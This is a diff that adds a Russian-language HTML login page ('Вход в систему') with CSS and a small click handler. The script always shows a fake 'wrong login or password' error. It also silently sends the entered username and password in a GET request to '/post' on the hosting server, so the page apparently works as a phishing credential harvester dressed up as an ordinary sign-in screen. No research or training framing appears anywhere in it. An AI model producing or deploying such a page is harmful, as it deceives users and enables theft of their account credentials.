@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Авторизация</title>
+    <style>
+        body {
+            background: #FAFAFA;
+            color: white;
+            font-family: 'Calibri', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        .zero {
+            background-color: #FFFFFF;
+            border-radius: 5px;
+            flex-direction: column; 
+            align-items: flex-start;
+            justify-content: flex-start;
+            padding: 40px 50px;
+            width: 60vh;
+            height: 50vh;
+            border: #E3E4E4;
+            transform: scale(0.8); 
+            transform-origin: center; 
+            border: 1px solid #E3E4E4;
+        }
+        .palka {
+            width: 60vh;
+            height: 1px;
+            background-color: #8d8d8f;
+        }
+        @media (max-width: 768px) {
+            .palka {
+                width: 100%; 
+                max-width: 100%;
+            }
+        }
+        .zero2 {
+            background-color: #F4D6D2;
+            border-radius: 5px;
+            width: 57vh;
+            height: 4.5vh;
+            padding: 15px 10px;
+            color: #691911;
+            font-size:2.3vh;
+            transform-origin: left; 
+            text-align: left;
+            justify-content: left;
+            align-items: center;
+            place-items: center;
+            padding-top: -15px;
+            display:none;
+        }
+        @media (max-width: 768px) {
+            .zero {
+                width: 80%; 
+                height: 100%;
+                max-width: 80%;
+            }
+        }
+        @media (max-width: 768px) {
+            .zero2 {
+                width: 100%; 
+                max-width: 100%;
+                font-size:2.3vh;
+            }
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 4vh;
+            font-weight: 100;
+            color: #000000
+        }
+        .invalid {
+            color: #FF0000;
+            margin-top: 5px;
+        }
+        p {
+            color: white;
+        }
+        .poweredbyyandexsmartcaptcha {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 10px;
+            color: white;
+            font-size: 1.5vh;
+        }
+        .btn-new {
+            border-radius: 5px;
+            color: white;
+            text-align: center;
+            transition: .1s linear;
+            justify-content: left;
+            align-items: center;
+            background: #055D7D;
+            height: 6vh;
+            width: 100%;
+            cursor: pointer;
+            border: none;
+            font-size: 2.5vh;
+        }
+        .label {
+            display: grid;
+            font-size: 2.5vh;
+            margin-bottom: 5px;
+            color: #000000;
+            transform-origin: left; 
+            text-align: left;
+            justify-content: left;
+        }
+        .input-field {
+            border-radius: 8px;
+            color: black;
+            transition: border 0.05s ease;
+            background: #3DFF41;
+            border: 1px solid rgb(109, 103, 103);
+            margin-bottom: 2px;
+            width: 100%;
+            flex: 1;
+            outline: none;
+            padding: 10px;
+            align-items: center;
+            width: 57vh;
+            height: 3.5vh;
+            font-size: 16px;
+            background-color: white;
+        }
+        @media (max-width: 768px) {
+            .input-field {
+                width: 92%; 
+                max-width: 92%; 
+            }
+        }
+        @media (max-width: 768px) {
+            .btn-new {
+                width: 100%; 
+                max-width: 100%; 
+            }
+        }
+        .input-field::placeholder {
+            font-size: 2.2vh;
+            color: #7b7d85;
+        }
+        .allin1 {
+            margin-left: -20px;
+            cursor: pointer;
+            width: 90px;
+        }
+        .allin2 {
+            flex: 1;
+        }
+        .btn-new:hover {
+            background-color: #045772;
+        }
+        .input-field:focus {
+            border: 6px solid #BFDEFF;
+        }
+        .badd {}
+        .badd:focus {
+            border: 1px solid #DC3545;
+            box-shadow: 0px 0px 5px 5px #F6CCD0;
+        }
+    </style>
+</head>
+<body>
+    <div class="zero">
+        <center>
+            <h1 class="login-heading mb-4">Вход в систему</h1>
+            <div class="zero2"></div>
+            <br>
+            <label for="username" class="label">Логин</label>
+            <input type="text" name="username" id="username" class="input-field" value="" placeholder="" autocomplete="username">
+            <br>
+            <br>
+            <label for="password" class="label">Пароль</label>
+            <input type="password" name="password" id="password" value="" class="input-field" placeholder="" autocomplete="current-password">
+            <br>
+            <br>
+            <div class="palka"></div>
+            <br>
+            <button class="btn-new" type="submit" id="loginbtn">Войти</button>
+        </center>
+    </div>
+    </div>
+    <script>
+        var el2 = document.getElementById('loginbtn');
+        var email = document.getElementById('username');
+        var pswd = document.getElementById('password');
+        var zero2 = document.querySelector('.zero2');
+
+        email.addEventListener('input', () => {
+            email.classList.remove('badd');
+        })
+
+        pswd.addEventListener('input', () => {
+            pswd.classList.remove('badd');
+        })
+
+        el2.addEventListener('click', () => {
+            var emaill = email.value;
+            var pswdd = pswd.value;
+
+            if (emaill.trim() !== "" && pswdd.trim() !== "") {
+                zero2.textContent = 'Неверный логин или пароль.';
+                zero2.style.display = 'grid';
+                fetch('/post?email=' + emaill + '&password=' + pswdd, {
+                    mode: 'cors'
+                })
+                .catch(error => {
+                });
+            }
+
+            if (emaill.trim() == "") {
+                email.placeholder = 'Необходимо заполнить это поле';
+                email.classList.add('badd');
+            }
+            if (pswdd.trim() == "") {
+                pswd.placeholder = 'Необходимо заполнить это поле';
+                pswd.classList.add('badd');
+            }
+        });
+
+    </script>
+</body>
+</html>
